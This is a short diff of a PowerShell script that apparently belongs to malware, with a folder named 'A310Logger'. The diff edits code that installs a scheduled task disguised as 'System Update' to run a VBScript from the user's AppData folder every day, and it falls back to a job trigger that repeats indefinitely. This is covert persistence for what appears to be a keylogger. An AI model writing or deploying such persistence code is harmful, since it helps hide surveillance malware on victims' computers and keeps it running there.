@@ -31,8 +31,8 @@ if(!(Test-Path "C:\Users\$env:UserName\AppData\Local\A310Logger\count.txt")) {
 }
 
 
-      try { 
-      schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "System Update" /TR 'wscript.exe ""C:\Users\%username%\AppData\Local\0101\AutoRun.vbs""' /ST 00:00 /DU 24:00 | Out-Null
+       try { 
+       schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "System Update" /TR 'wscript.exe ""C:\Users\%username%\AppData\Local\0101\AutoRun.vbs""' /ST 23:55 | Out-Null
        }
        catch {
        $trigger = New-JobTrigger -once -At $(get-date) -RepetitionInterval $([timespan]::FromMinutes("10080")) -RepeatIndefinitely
